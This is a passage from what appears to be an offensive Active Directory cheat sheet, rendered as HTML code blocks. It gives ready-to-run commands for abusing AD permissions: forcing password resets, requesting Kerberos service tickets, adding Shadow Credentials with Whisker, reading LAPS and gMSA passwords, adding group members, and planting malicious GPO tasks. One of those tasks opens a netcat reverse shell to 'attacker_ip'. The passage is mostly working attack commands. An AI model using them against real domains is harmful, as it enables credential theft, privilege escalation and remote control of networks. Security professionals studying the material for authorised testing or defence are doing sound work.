class="cm-string">'ops/whatever1'</span><span class="cm-punctuation">}</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">    <span class="cm-comment">#Using ActiveDirectory module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-ADUser</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-identifier">user</span> <span class="cm-operator">-</span><span class="cm-identifier">ServicePrincipalNames</span> <span class="cm-punctuation">@{</span><span class="cm-identifier">Add</span><span class="cm-operator">=</span><span class="cm-string">'ops/whatever1'</span><span class="cm-punctuation">}</span> </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#Request the ticket</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Add-Type</span> <span class="cm-operator">-</span><span class="cm-identifier">AssemblyNAme</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityModel</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">IdentityModel</span><span class="cm-punctuation">.</span><span class="cm-identifier">Tokens</span><span class="cm-punctuation">.</span><span class="cm-identifier">KerberosRequestorSecurityToken</span> <span class="cm-operator">-</span><span class="cm-identifier">ArgumentList</span> <span class="cm-string">"ops/whatever1"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">    <span class="cm-comment">#From PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Request-SPNTicket</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 228px;"></div><div class="CodeMirror-gutters" style="height: 278px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h5 id="bkmrk-user-force-change-pa">User-Force-Change-Password</h5>
<p id="bkmrk-with-enough-permissi">With enough permissions on a user, we can change his password</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 608px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 142px; min-width: 607.762px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">net</span> <span class="cm-identifier">user</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-identifier">Password123</span><span class="cm-operator">!</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$pass</span> <span class="cm-operator">=</span> <span class="cm-builtin">ConvertTo-SecureString</span> <span class="cm-string">"Password123!"</span> <span class="cm-operator">-</span><span class="cm-identifier">AsPlainText</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$cred</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-Object</span> <span class="cm-identifier">System</span><span class="cm-punctuation">.</span><span class="cm-identifier">Management</span><span class="cm-punctuation">.</span><span class="cm-identifier">Automation</span><span class="cm-punctuation">.</span><span class="cm-identifier">PSCredential</span><span class="cm-punctuation">(</span><span class="cm-string">"domain\user1"</span><span class="cm-punctuation">,</span> <span class="cm-variable-2">$pass</span><span class="cm-punctuation">)</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-DomainUserPassword</span> <span class="cm-string">"&lt;target&gt;"</span> <span class="cm-operator">-</span><span class="cm-identifier">AccountPassword</span> <span class="cm-variable-2">$UserPassword</span> <span class="cm-operator">-</span><span class="cm-identifier">Credential</span> <span class="cm-variable-2">$cred</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 142px;"></div><div class="CodeMirror-gutters" style="height: 192px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-on-a-computer">On a computer</h4>
<h5 id="bkmrk-writeproperty-0">WriteProperty</h5>
<ul id="bkmrk-shadowcredentials-0"><li>ShadowCredentials</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 890px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 890.048px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Whisker</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">add</span> <span class="cm-operator">/</span><span class="cm-identifier">target</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">dc</span><span class="cm-operator">:</span><span class="cm-identifier">dc</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">path</span><span class="cm-operator">:</span><span class="cm-builtin">C:</span><span class="cm-punctuation">\</span><span class="cm-identifier">path</span><span class="cm-punctuation">\</span><span class="cm-identifier">to</span><span class="cm-punctuation">\</span><span class="cm-identifier">file</span><span class="cm-punctuation">.</span><span class="cm-identifier">pfx</span> <span class="cm-operator">/</span><span class="cm-identifier">password</span><span class="cm-operator">:</span><span class="cm-identifier">Password123</span><span class="cm-operator">!</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-kerberos-rbcd"><li>Kerberos RBCD</li>
</ul><h5 id="bkmrk-allextendedrights">AllExtendedRights</h5>
<ul id="bkmrk-readlapspassword"><li>ReadLAPSPassword</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 774px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 55px; min-width: 774.238px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># With PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Get-DomainComputer</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span><span class="cm-punctuation">.</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">-</span><span class="cm-identifier">Properties</span> <span class="cm-identifier">ms-mcs-AdmPwd</span><span class="cm-punctuation">,</span><span class="cm-identifier">displayname</span><span class="cm-punctuation">,</span><span class="cm-identifier">ms-mcs-AdmPwdExpirationTime</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 55px;"></div><div class="CodeMirror-gutters" style="height: 105px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-readgmsapassword"><li>ReadGMSAPassword</li>
</ul><div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 369px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 368.905px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">GMSAPasswordReader</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">accountname</span> <span class="cm-identifier">gmsaAccount</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<ul id="bkmrk-rbcd"><li>RBCD</li>
</ul><p id="bkmrk-it-seems-that-an-rbc">It seems that an RBCD can be realized with AllExtendedRights on a computer as well.</p>
<h4 id="bkmrk-on-a-group">On a group</h4>
<h5 id="bkmrk-writeproperty%2Fallext">WriteProperty/AllExtendedRights/GenericWrite Self</h5>
<p id="bkmrk-with-one-of-this-rig">With one of this rights we can add a new member to the group</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 477px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 477.476px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">net</span> <span class="cm-builtin">group</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target_group</span><span class="cm-operator">&gt;</span> <span class="cm-identifier">user1</span> <span class="cm-operator">/</span><span class="cm-identifier">add</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment"># With PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Add-DomainGroupMember</span> <span class="cm-operator">-</span><span class="cm-identifier">Identity</span> <span class="cm-string">'&lt;target_group&gt;'</span> <span class="cm-operator">-</span><span class="cm-identifier">Members</span> <span class="cm-string">'user1'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-on-gpo">On GPO</h4>
<h5 id="bkmrk-writeproperty-on-a-g">WriteProperty on a GPO</h5>
<p id="bkmrk-we-can-create-an-%22ev">We can create an "evil" GPO with a scheduled task for example</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1310px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 1309.86px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With PowerView</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">New-GPOImmediateTask</span> <span class="cm-operator">-</span><span class="cm-identifier">Verbose</span> <span class="cm-operator">-</span><span class="cm-identifier">Force</span> <span class="cm-operator">-</span><span class="cm-identifier">TaskName</span> <span class="cm-string">'Update'</span> <span class="cm-operator">-</span><span class="cm-identifier">GPODisplayName</span> <span class="cm-string">'weakGPO'</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-identifier">cmd</span> <span class="cm-operator">-</span><span class="cm-identifier">CommandArguments</span> <span class="cm-string">"/c net localgroup administrators user1 /add"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With SharpGPOAbuse</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">SharpGPOAbuse</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">--</span><span class="cm-identifier">AddComputerTask</span> <span class="cm-operator">--</span><span class="cm-identifier">TaskName</span> <span class="cm-string">"Update"</span> <span class="cm-operator">--</span><span class="cm-identifier">Author</span> <span class="cm-identifier">Administrator</span> <span class="cm-operator">--</span><span class="cm-identifier">Command</span> <span class="cm-string">"cmd.exe"</span> <span class="cm-operator">--</span><span class="cm-identifier">Arguments</span> <span class="cm-string">"/c /tmp/nc.exe attacker_ip 4545 -e powershell"</span> <span class="cm-operator">--</span><span class="cm-identifier">GPOName</span> <span class="cm-string">"weakGPO"</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h5 id="bkmrk-createchild-on-polic">CreateChild on Policies Cn + WriteProperty on an OU</h5>
<p id="bkmrk-it-is-possible-to-cr">It is possible to create a fully new GPO and link it to an existing OU</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1657px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 1657.29px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With RSAT module</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">New-GPO</span> <span class="cm-operator">-</span><span class="cm-identifier">Name</span> <span class="cm-string">"New GPO"</span> <span class="cm-operator">|</span> <span class="cm-identifier">New-GPLink</span> <span class="cm-operator">-</span><span class="cm-identifier">Target</span> <span class="cm-string">"OU=Workstation,DC=domain,DC=local"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Set-GPPrefRegistryValue</span> <span class="cm-operator">-</span><span class="cm-identifier">Name</span> <span class="cm-string">"New 